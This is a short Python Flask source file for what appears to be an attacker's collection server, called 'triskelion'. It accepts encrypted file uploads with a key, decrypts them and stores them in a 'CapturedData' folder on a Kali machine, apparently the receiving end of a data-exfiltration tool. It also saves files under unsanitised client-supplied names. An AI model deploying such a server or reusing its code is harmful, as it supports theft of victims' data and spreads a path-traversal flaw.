from flask import Flask, request
import os
from cryptography.fernet import Fernet

app = Flask(__name__)
UPLOAD_FOLDER = '/home/kali/Desktop/CapturedData'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def decrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

@app.route('/')
def server_test():
    return 'Welcome to the triskelion server'

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files or 'key' not in request.form:
        return 'No file or key provided', 400
    file = request.files['file']
    key = request.form['key'].encode()  # Convert key from string to bytes

    if file.filename == '':
        return 'No selected file', 400
    if file:
        filename = file.filename
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)
        try:
            decrypt_file(file_path, key)
            return 'File uploaded and decrypted successfully', 200
        except Exception as e:
            return f'Error decrypting file: {str(e)}', 500

if __name__ == '__main__':
    if not os.path.exists(UPLOAD_FOLDER):
        os.makedirs(UPLOAD_FOLDER)
    app.run(host='0.0.0.0', port=5000)
